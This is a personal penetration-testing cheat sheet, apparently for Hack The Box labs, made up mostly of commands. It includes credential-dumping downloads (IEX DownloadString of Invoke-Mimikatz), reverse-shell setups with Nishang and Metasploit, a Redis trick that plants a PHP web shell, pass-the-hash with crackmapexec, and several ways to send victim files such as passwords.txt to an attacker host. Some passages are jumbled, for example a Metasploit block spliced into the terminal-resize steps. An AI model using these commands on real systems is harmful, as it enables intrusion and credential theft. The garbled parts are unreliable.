
##### Table of Contents  
- [NMAP](#NMAP)
- [FTP](#FTP)
- [HTTP](#HTTP)
- [SMB](#SMB)
- [LDAP](#LDAP)
- [DNS](#DNS)
- [File Transfer to Victim](#File-Transfer-To-Victim)
- [File Transfer from Victim](#File-Transfer-From-Victim)
- [Upgrading Reverse Shells to be Fully Interactive](#Upgrading Reverse Shells to be Fully Interactive)
- [Redis](#Reids)
- [Search files](#Search files)
- [Python SERVER](#Python SERVER)
- [Nishang](#Nishang)
- [Shells](#Shells)
- [Metasploit](#Metasploit)
- [Privilige Escalation](#Privilige Escalation)





# NMAP
nmap -sC -sV -sT -oA NMAP/HTB 10.10.10.161

# FTP
ftp $targetip
Username: anonymous
Password: anything

# HTTP

gobuster dir -w /usr/share/wordlists/dirb/big.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.157:80 -o   gobuster_10.10.10.157_80.txt


# SMB

## SMBCLIENT
- smbclient -N -L //10.10.10.161/

- smbclient -L \\10.10.10.3

WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))

- smbclient -N //10.10.10.161/Share

## SMBMAP

- smbmap -H 10.10.10.3
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.3...
[+] IP: 10.10.10.3:445	Name: 10.10.10.3                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	tmp                                               	READ, WRITE
	opt                                               	NO ACCESS
	IPC$                                              	NO ACCESS
	ADMIN$                                            	NO ACCESS

- smbmap -H 10.10.10.161 -u anonymous -d HTB.LOCAL

- smbmap -H 10.10.10.161 -u anonymous -d localhost

## crackmapexec
- KALI: `crackmapexec smb 10.10.10.161 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`

- Samba 3.0.20 < 3.0.25rc3 **exploit**

https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851

- Link do enumeracji: https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html?fbclid=IwAR1qQDsLzkudInhrnUwL1V9ONiVXMD-vW1V5hrEI92xmuhlExEFOmyu_3xc#check-null-sessions

- NetNTLM relaying:

https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

## LDAP
ldapsearch -x -h 10.10.10.161 -s base namingcontexts
ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb" 

responder.py -I eth0 -w -f

-w : WPAD rogue server
-f : This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.

## DNS
nslookup
SERVER 10.10.10.161
- 127.0.0.1
- 10.10.10.161

dnsrecon -r 127.0.0.0/24 -n 10.10.10.161

dnsrecon -r 127.0.1.0/24 -n 10.10.10.161

dnsrecon -r 10.10.10.0/24 -n 10.10.10.161


dig axfr @10.10.10.161

dig axfr bank.htb @10.10.10.161

## Upgrading Reverse Shells to be Fully Interactive
python -c "import pty; pty.spawn('/bin/bash')"
Press Ctrl+Z to background your reverse shell, then in your local machine run: 
- stty raw -echo
- fg

Type reset and hit return. You should be presented with a fully interactive shell. You’re welcome.

There’s still one little niggling thing that can happen, the shell might not be the correct height/width for your terminal. To fix this, go to your local machine and run:

stty size

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf5 > use exploit/multi/handler


msf5 exploit(multi/handler) > set lhost 10.10.14.17
lhost => 10.10.14.17
msf5 exploit(multi/handler) > set lport 8080
lport => 8080This should return two numbers, which are the number of rows and columns in your terminal. For example’s sake let’s say this command returned 48 120 Head on back to your victim box’s shell and run the following.

stty -rows 48 -columns 120

# File Transfer to Victim

## PowerShell - BASE64
- KALI: `cat file | base64 -w 0;echo`
- VICTIM: `[IO.Fi[IO.File]::WriteAllBytes("C:\Users\Public\file", [Convert]::FromBase64String("LS0t......="))`

## PowerShell - DownloadFile
- VICTIM: `(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')`

- VICTIM: `(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')`

## PowerShell - IEX
- VICTIM: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
 
- VICTIM: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`

## PowerShell Invoke-WebRequest (PowerShell 3.0 and higher)
- VICTIM: `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`

You should also use these arguments:
- -UseBasicParsing
- [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

## SMB
- KALI: `sudo impacket-smbserver share -smb2support /tmp/`
- VICTIM: `copy \\192.168.1.13\share\nc.exe`

If you get an error, use an account name and password:
- KALI: `sudo impacket-smbserver share -smb2support /tmp/smbshare -user gajos -password gajos`
- VICTIM: `net use g: \\192.168.1.13\share /user:test test`

## FTP
- KALI: `sudo pip3 install pyftpdlib`
- KALI: `sudo python3 -m pyftpdlib --port 21`
- VICTIM: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.1.13/file', 'file')`

# File Transfer From Victim

## PowerShell - Base64
- VICTIM: `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`

## PowerShell - POST Upload
- KALI: `pip3 install uploadserver`
- KALI: `python3 -m uploadserver`
- VICTIM: `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
- VICTIM: `Invoke-FileUpload -Uri http://192.168.1.13:8000/upload -File C:\Windows\System32\drivers\etc\hosts`

## PowerShell - Base64 POST Upload
- KALI: `nc -lvnp 8000`
- VICTIM: `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
- VICTIM: `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`

## SMB
- KALI: `sudo impacket-smbserver share -smb2support /tmp/`
- VICTIM: `copy C:\Users\Rem\Desktop\passwords.txt \192.168.1.13\share\`

## WebDav Uploads
SMB over HTTP. If you try to upload files via SMB, but nothing is listening on port 445, a client will also try to upload a file via HTTP(s).
- KALI: `sudo pip install wsgidav cheroot`
- KALI: `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
- VICTIM: `dir \\192.168.49.128\DavWWWRoot`

DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

- VICTIM: `copy C:\Users\Rem\Desktop\passwords.txt \\192.168.1.13\DavWWWRoot\`

## FTP
- KALI: `sudo python3 -m pyftpdlib --port 21 --write`
- VICTIM: '(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
 
# Redis

https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

flushall

set PleaseSubscribe "<? system($_REQUEST['cmd']); ?>"

config set dbfilename shell.php

config set dir /var/www/html/

save

# Search files

- dir secret.doc /s /p (Windows)
- find -O3 -L /var/www/ -name "\*.html" (Linux)

## Python SERVER

python -m simpleHTTPServer

## Nishang

Linux Site:

- gedit Invoke-PowerShellTcp.ps1 (Invoke-PowerShellTcp -Reverse -IPAdress 192.168.1.32 -Port 4444
- python -m SimpleHTTPServer
- nc -lvp 4444

Windows Site:

- C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1')

Encoded payload:

- cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard

## Shells

https://www.yeahhub.com/msfvenom-all-payload-examples-cheatsheet-2017/

## Metasploit

**Handler**
- msf> use multi/handler
- msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp
- msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55)

**Privilige Escalation 1**
- getsystem

**Privilige Escalation 1**
- multi/recon/local_exploit_suggester
- background
- set session 1
- run

## Privilige Escalation

-Windows

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

https://guif.re/windowseop?fbclid=IwAR2fwsD6D7XjFhZbD4IGSTHtQkGs5D7HXEwVEnCYSQEDWzsuqds8geOi7uc#EoP%208:%20Kernel%20vulnerabilities

https://www.scip.ch/en/?labs.20181011

- Linux
https://gtfobins.github.io/

# Appache Tomcat

- Default Credentials

https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

